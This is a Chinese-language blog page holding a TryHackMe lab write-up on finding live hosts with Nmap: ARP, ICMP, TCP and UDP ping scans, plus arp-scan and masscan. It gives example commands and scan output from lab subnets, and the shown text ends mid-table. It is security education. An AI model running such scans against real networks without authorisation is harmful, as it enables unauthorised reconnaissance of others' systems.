<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="May the Force be with you.">
<meta property="og:type" content="website">
<meta property="og:title" content="hxt&#39;s Blog">
<meta property="og:url" content="http://example.com/page/6/index.html">
<meta property="og:site_name" content="hxt&#39;s Blog">
<meta property="og:description" content="May the Force be with you.">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="hxt">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/6/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>hxt's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>


<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">hxt's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/28/Nmap-live-host/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Nmap-live-host/" class="post-title-link" itemprop="url">Nmap Live Host Discovery</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-28 14:30:13" itemprop="dateCreated datePublished" datetime="2023-02-28T14:30:13+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-01-24 22:12:43" itemprop="dateModified" datetime="2023-01-24T22:12:43+08:00">2023-01-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>8.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>8 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/nmap01</p>
<h2 id="introduction">Introduction</h2>
<p>这个房间主要介绍了如何使用 Nmap 查找活动主机(live
host)。用于发现活动主机的方法包括：</p>
<ul>
<li>ARP 扫描：这种扫描使用 ARP 请求来发现活动主机。</li>
<li>ICMP 扫描：这种扫描使用 ICMP 请求来标识活动主机。</li>
<li>TCP / UDP ping 扫描：此扫描将数据包发送到 TCP 端口和 UDP
端口以确定活动主机。</li>
</ul>
<p>我们还将介绍两种扫描器：<code>arp-scan</code>和<code>masscan</code>。并解释它们如何与
Nmap 发现活动主机这一部分重叠。</p>
<p>下面是 Nmap
扫描通常要经历的步骤，其中很多步骤是可选的，取决于提供的参数。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230122092609574.png" alt="image-20230122092609574">
<figcaption aria-hidden="true">image-20230122092609574</figcaption>
</figure>
<h2 id="subnetworks子网">Subnetworks（子网）</h2>
<p><em>网段</em>
是使用共享介质连接的一组计算机，这些介质可以是以太网交换机或 WIFI
接入点。在IP网络中，<em>子网</em>
通常相当于连接在一起并配置为使用相同路由器的一个或多个网段。网段是指物理连接，而子网是指逻辑连接。</p>
<p>下图中有四个网段或子网。每个子网有它自己的 IP
地址范围，并通过路由器连接到更大的网络中。根据每个网络，可能有防火墙强制执行安全策略。</p>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/aa787518e856e0094cb40da8399be0f3.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>如果你连接到相同的子网，你会期望你的扫描器依赖于 ARP
(地址解析协议)查询来发现活动主机。ARP 查询的目的是获取硬件地址(MAC 地址)
，这样就可以通过链路层进行通信，然而，我们可以利用这一点来推断主机是否在线。</p>
<p>如果你在网络 A 中，使用 ARP
只能发现该子网（10.1.100.0/24）中的设备。假设你已连接到与目标系统子网不同的子网。在这种情况下，扫描仪生成的所有数据包将通过默认网关（路由器）进行路由，以到达另一个子网上的系统。但是，ARP查询不会被路由，因此无法越过子网路由器。ARP
是一个链路层协议，ARP 数据包被绑定到其对应的子网。</p>
<h2 id="enumerating-targets枚举目标">Enumerating
Targets（枚举目标）</h2>
<p>在扫描之前，我们需要指定目标，一般而言，目标可以是：列表、范围或是一个子网，示例如下：</p>
<ul>
<li>list：<code>MACHINE_IP scanme.nmap.org example.com</code> 将扫描 3
个IP地址。</li>
<li>range：<code>10.11.12.15-20</code>将扫描 6
个IP地址：<code>10.11.12.15</code>、<code>10.11.12.16</code> ······
以及<code>10.11.12.20</code>。</li>
<li>subnet：<code>MACHINE_IP/30</code>将扫描 4
个IP地址。（转换为二进制来看，子网部分有 30 位，主机部分有 2
位；因此共有 2<sup>2</sup>=4 个主机即 IP 地址）</li>
</ul>
<p>还可以提供一个文件作为目标列表的输入：<code>nmap -iL list_of_hosts.txt</code></p>
<p>如果要检查 Nmap
将扫描的主机列表，则可以使用<code>nmap -sL TARGETS</code>。此选项将为你提供
Nmap 将要扫描而无需扫描的主机的详细列表；但是，Nmap
将尝试对所有目标进行反向 DNS
解析，以获取其域名。域名可能会向渗透测试者透露各种信息。（如果你不希望
Nmap 连接到DNS服务器，则可以添加<code>-n</code>。）</p>
<h2 id="discovering-live-hosts">Discovering Live Hosts</h2>
<p>让我们回顾下图所示的 TCP/IP 层，利用协议来发现活动主机：</p>
<ul>
<li>ARP（链路层）：向网段上的广播地址发送一个帧，并要求具有特定 IP
地址的计算机通过提供其MAC（硬件）地址进行响应。</li>
<li>ICMP（网络层）：ICMP有<a target="_blank" rel="noopener" href="https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml">多种类型</a>。ICMP
ping使用类型 8（Echo）和类型 0（Echo Reply）。如果你想 ping
同一子网上的系统，ARP 查询应该在 ICMP Echo之前使用。</li>
<li>TCP（传输层）：扫描仪可以向通用TCP或UDP端口发送一个特制的数据包，以检查目标是否会响应。此方法非常有效，尤其是当
ICMP Echo 被阻止时。</li>
<li>UDP（传输层）：同上。</li>
</ul>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/745e0412b319d324352c7b29863b74f4.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<h2 id="nmap-host-discovery-using-arp">Nmap Host Discovery Using
ARP</h2>
<p>Nmap 遵循以下方法来发现活动主机：</p>
<ol type="1">
<li>当特权用户试图扫描本地网络（以太网）上的目标时，Nmap使用ARP请求。特权用户是<code>root</code>用户或属于<code>sudoers</code>并可以运行<code>sudo</code>的用户。</li>
<li>当特权用户尝试扫描本地网络外的目标时，Nmap 使用 ICMP
回显请求、端口80的TCP ACK（确认）、端口443的 TCP SYN（同步）和 ICMP
时间戳请求。</li>
<li>当非特权用户试图扫描本地网络之外的目标时，Nmap 采用 TCP
三次握手方式，将 SYN 数据包发送到 80 和 443 端口。</li>
</ol>
<p>默认情况下，Nmap 使用 ping
扫描来查找活动主机，并且只扫描活动主机。如果希望使用 Nmap
在不扫描系统端口的情况下发现在线主机，可以使用<code>nmap -sn TARGETS</code>。</p>
<p>只有当你和目标系统在同一子网中时，ARP
扫描才可能使用。在以太网（802.3）和
WiFi（802.11）上，你需要知道目标系统的 MAC
地址才能够与之通信。MAC地址是链路层报头所必需的；报头包含源 MAC
地址和目标 MAC 地址以及其他字段。为了获得 MAC 地址，操作系统会发送 ARP
查询。ARP 查询仅在目标与你所在的子网相同时有效，即在相同的以太网或 WiFi
上。在对本地网络进行 Nmap 扫描期间，应该会看到许多 ARP 查询。如果您希望
Nmap 只执行 ARP
扫描而不扫描端口，那么可以使用<code>Nmap -PR -sn TARGETS</code>，其中<code>-PR</code>表示你只需要进行
ARP 扫描。下面的示例显示了 Nmap 使用 ARP
进行主机查找而不进行端口扫描。运行<code>nmap -PR -sn MACHINE_IP/24</code>来发现与目标机器在同一子网上的所有系统。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo nmap -PR -sn 10.10.210.6/24</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-02 07:12 BST</span><br><span class="line">Nmap scan report for ip-10-10-210-75.eu-west-1.compute.internal (10.10.210.75)</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">MAC Address: 02:83:75:3A:F2:89 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-210-100.eu-west-1.compute.internal (10.10.210.100)</span><br><span class="line">Host is up (-0.100s latency).</span><br><span class="line">MAC Address: 02:63:D0:1B:2D:CD (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-210-165.eu-west-1.compute.internal (10.10.210.165)</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">MAC Address: 02:59:79:4F:17:B7 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-210-6.eu-west-1.compute.internal (10.10.210.6)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 3.12 seconds</span><br></pre></td></tr></tbody></table></figure>
<p>在本例中，AtackBox 的 IP 地址是10.10.210.6，它使用 ARP
请求来发现同一子网上的活动主机。</p>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f0ce4cd34b827f529255c5c73bb909d1.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>说到 ARP 扫描，我们应该提到一个围绕 ARP
查询构建的扫描器：<code>arp-scan</code>；它提供了许多自定义扫描的选项。有关详细信息，请访问
<a target="_blank" rel="noopener" href="http://www.royhills.co.uk/wiki/index.php/Main_Page">arp-scanner
wiki</a>。一个常见的选择是 <code>arp-scan --localnet</code> 或者简单的
<code>arp-scan -l</code>。这个命令将发送 ARP 查询到本地网络上所有有效的
IP
地址。此外，如果你的系统有多个接口，并且你有兴趣发现其中一个上的活动主机，你可以使用<code>-I</code>
指定具体接口，例如，<code>sudo arp-scan -I eth0 -l</code>
将向<code>eth0</code>接口上的所有有效IP地址发送 ARP 查询。</p>
<p>在下面的示例中，我们使用<code>arp-scan ATTACKBOX_IP/24</code>扫描了
AtackBox 的子网。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo arp-scan 10.10.210.6/24</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">WARNING: host part of 10.10.210.6/24 is non-zero</span><br><span class="line">Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)</span><br><span class="line">10.10.210.75	02:83:75:3a:f2:89	(Unknown)</span><br><span class="line">10.10.210.100	02:63:d0:1b:2d:cd	(Unknown)</span><br><span class="line">10.10.210.165	02:59:79:4f:17:b7	(Unknown)</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9: 256 hosts scanned in 2.726 seconds (93.91 hosts/sec). 3 responded</span><br></pre></td></tr></tbody></table></figure>
<h2 id="nmap-host-discovery-using-icmp">Nmap Host Discovery Using
ICMP</h2>
<p>我们可以 ping 目标网络上的每个 IP 地址，看看谁用 ping reply (ICMP
Type 0) 来响应我们的<code>ping</code> (ICMP Type 8/Echo)
请求。尽管这将是最直接的方法，但它并不总是可靠的。许多防火墙会阻止 ICMP
echo ；Windows 配置了一个主机防火墙，默认情况下阻止 ICMP echo
请求。请记住，如果目标位于相同的子网上，则 ARP 查询将先于 ICMP
请求。</p>
<h3 id="pe">-PE</h3>
<p>若要使用 ICMP echo request 来发现活动主机，请添加选项
<code>-PE</code>。(记住，如果你不想进行端口扫描，请添加
<code>-sn</code>。)如下图所示，ICMP echo 扫描通过发送 ICMP echo request
来工作，并期望目标使用 ICMP echo reply 进行应答。</p>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/25fb5fd5d2009cf69d7aae40e8fde2ec.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>在下面的示例中，我们使用<code>nmap -PE -sn MACHINE_IP/24</code>扫描了目标所在的子网。此扫描将向子网上的每个
IP 地址发送 ICMP echo
数据包。下面的输出显示了使用<code>sudo nmap -PE -sn MACHINE_IP/24</code>扫描虚拟机的
C 类子网的结果。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo nmap -PE -sn 10.10.68.220/24</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-02 10:16 BST</span><br><span class="line">Nmap scan report for ip-10-10-68-50.eu-west-1.compute.internal (10.10.68.50)</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 02:95:36:71:5B:87 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-52.eu-west-1.compute.internal (10.10.68.52)</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 02:48:E8:BF:78:E7 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-77.eu-west-1.compute.internal (10.10.68.77)</span><br><span class="line">Host is up (-0.100s latency).</span><br><span class="line">MAC Address: 02:0F:0A:1D:76:35 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-110.eu-west-1.compute.internal (10.10.68.110)</span><br><span class="line">Host is up (-0.10s latency).</span><br><span class="line">MAC Address: 02:6B:50:E9:C2:91 (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-140.eu-west-1.compute.internal (10.10.68.140)</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">MAC Address: 02:58:59:63:0B:6B (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-142.eu-west-1.compute.internal (10.10.68.142)</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 02:C6:41:51:0A:0F (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-220.eu-west-1.compute.internal (10.10.68.220)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">MAC Address: 02:25:3F:DB:EE:0B (Unknown)</span><br><span class="line">Nmap scan report for ip-10-10-68-222.eu-west-1.compute.internal (10.10.68.222)</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">MAC Address: 02:28:B1:2E:B0:1B (Unknown)</span><br><span class="line">Nmap done: 256 IP addresses (8 hosts up) scanned in 2.11 seconds</span><br></pre></td></tr></tbody></table></figure>
<p>扫描输出显示八台主机已启动；此外，还显示了它们的MAC地址。一般来说，除非目标与我们的系统位于同一子网，否则我们没必要了解目标的
MAC 地址。上面的输出表明，Nmap不需要发送 ICMP 数据包，因为它根据收到的
ARP 响应确认这些主机已启动。</p>
<p>我们将重复上面的扫描;
然而，这一次，我们将从属于其他子网的系统进行扫描。结果是相似的，但没有
MAC 地址。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo nmap -PE -sn 10.10.68.220/24</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 12:16 EEST</span><br><span class="line">Nmap scan report for 10.10.68.50</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Nmap scan report for 10.10.68.52</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Nmap scan report for 10.10.68.77</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.110</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.140</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.142</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.220</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.222</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap done: 256 IP addresses (8 hosts up) scanned in 8.26 seconds</span><br></pre></td></tr></tbody></table></figure>
<h3 id="pp">-PP</h3>
<p>因为 ICMP echo 请求往往会被阻塞，所以你还可以考虑使用 ICMP 时间戳或
ICMP 地址掩码请求来判断系统是否在线。Nmap 使用时间戳请求(ICMP Type
13)并检查它是否将获得时间戳应答(ICMP Type
14)。添加<code>-PP</code>选项告诉 Nmap 使用 ICMP 时间戳请求。</p>
<h3 id="pm">-PM</h3>
<p>类似地，Nmap 通过添加<code>-PM</code>选项来使用地址掩码查询（ICMP
Type
17）。注意：该请求可能会被目标系统或防火墙过滤掉，这时，我们应该考虑使用另一种方法。</p>
<h2 id="nmap-host-discovery-using-tcp-and-udp">Nmap Host Discovery Using
TCP and UDP</h2>
<h3 id="tcp-syn-ping"><strong>TCP SYN Ping</strong></h3>
<p>我们可以将设置了SYN（同步）标志的数据包发送到 TCP 端口，默认情况下为
80 ，并等待响应。开放端口应回复 SYN/ACK （确认）；关闭的端口将导致
RST（重置）。在这种情况下，我们检查是否会得到任何回应，以推断主机是否启动。端口的特定状态在这里并不重要。下图提醒了
TCP 3次握手通常如何工作。</p>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/23e7f481f78de8d3e89ef845b747002d.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>TCP SYN ping
使用方法：<code>-PS</code>选项。<code>-PS</code>后可添加端口号、范围、列表或它们的组合，例如，<code>-PS21</code>将会以
21 号端口为目标，<code>-PS21-25</code>将会以端口 21 、22 、23 、24 、25
为目标。</p>
<h3 id="tcp-ack-ping"><strong>TCP ACK Ping</strong></h3>
<p>默认情况下，使用端口 80 。语法类似于 TCP SYN ping
。<code>-PA</code>后面应该是端口号、范围、列表或它们的组合。例如，<code>-PA21</code>、<code>-PA21-25</code>和<code>-PA80,443,8080</code>。如果未指定端口，将使用端口
80 。你必须作为特权用户运行 Nmap
才能完成此任务。如果你以非特权用户身份尝试，Nmap 将尝试进行3次握手。</p>
<p>下图显示了任何带有 ACK 标志的 TCP 数据包都应该返回 设置了 RST 标志的
TCP 数据包。由于带有 ACK 标志的 TCP 数据包不是任何 正在进行的连接
的一部分，因此目标使用设置的 RST
标志进行响应。预期响应用于检测目标主机是否已启动。</p>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/db5ab44a8c700c4ab0603e85e456040d.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p>下面是一个示例，运行<code>sudo nmap -PA -sn MACHINE_IP/24</code>以发现在线的主机。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pentester@TryHackMe$ sudo nmap -PA -sn 10.10.68.220/24</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 13:46 EEST</span><br><span class="line">Nmap scan report for 10.10.68.52</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Nmap scan report for 10.10.68.121</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Nmap scan report for 10.10.68.125</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Nmap scan report for 10.10.68.134</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Nmap scan report for 10.10.68.220</span><br><span class="line">Host is up (0.10s latency).</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 29.89 seconds</span><br></pre></td></tr></tbody></table></figure>
<h3 id="udp-ping"><strong>UDP Ping</strong></h3>
<p>与 TCP SYN ping 相反，将 UDP
数据包发送到开放端口不会有任何答复。但是，如果我们向一个关闭的 UDP
端口发送一个 UDP 数据包，我们希望得到一个 ICMP
端口无法访问的数据包；这表明目标系统已经启动并可用。Nmap
使用<code>-PU</code>来进行 UDP ping 。</p>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/1b827ef60c39619e281c4ca51a6d57b6.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<figure>
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c8b2d403667487322058619e561186d2.png" alt="img">
<figcaption aria-hidden="true">img</figcaption>
</figure>
<h3 id="masscan"><strong>Masscan</strong></h3>
<p>另外，Masscan
使用类似的方法来发现可用的系统。然而，为了快速完成网络扫描，Masscan
在数据包生成速度方面非常积极。语法与 Nmap 非常相似：<code>-p</code>
后面可以跟一个端口号、列表或范围。例如：</p>
<ul>
<li><code>masscan MACHINE_IP/24 -p443</code></li>
<li><code>masscan MACHINE_IP/24 -p80,443</code></li>
<li><code>masscan MACHINE_IP/24 -p22-25</code></li>
<li><code>masscan MACHINE_IP/24 ‐‐top-ports 100</code></li>
</ul>
<h2 id="using-reverse-dns-lookup反向dns查找">Using Reverse-DNS
Lookup（反向DNS查找）</h2>
<p>Nmap 的默认行为是使用反向 DNS
查找在线主机。因为主机名可以揭示很多东西，这可能是一个有用的步骤。但是，如果不希望发送此类
DNS 查询，可以使用 <code>-n</code> 跳过此步骤。</p>
<p>默认情况下，Nmap 将查找在线主机；但是，你可以使用选项 <code>-R</code>
来查询 DNS 服务器，即使是针对脱机主机。如果要使用特定的 DNS
服务器，可以添加<code>--dns-servers DNS_SERVER</code>选项。</p>
<h2 id="总结">总结</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">Scan Type</th>
<th style="text-align: center;">Example Command</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">ARP Scan</td>
<td style="text-align: center;"><code>sudo nmap -PR -sn MACHINE_IP/24</code></td>
</tr>
<tr class="even">
<td style="text-align: center;">ICMP Echo Scan</td>
<td style="text-align: center;"><code>sudo nmap -PE -sn MACHINE_IP/24</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;">ICMP Timestamp Scan</td>
<td style="text-align: center;"><code>sudo nmap -PP -sn MACHINE_IP/24</code></td>
</tr>
<tr class="even">
<td style="text-align: center;">ICMP Address Mask Scan</td>
<td style="text-align: center;"><code>sudo nmap -PM -sn MACHINE_IP/24</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;">TCP SYN Ping Scan</td>
<td style="text-align: center;"><code>sudo nmap -PS22,80,443 -sn MACHINE_IP/30</code></td>
</tr>
<tr class="even">
<td style="text-align: center;">TCP ACK Ping Scan</td>
<td style="text-align: center;"><code>sudo nmap -PA22,80,443 -sn MACHINE_IP/30</code></td>
</tr>
<tr class="odd">
<td style="text-align: center;">UDP Ping Scan</td>
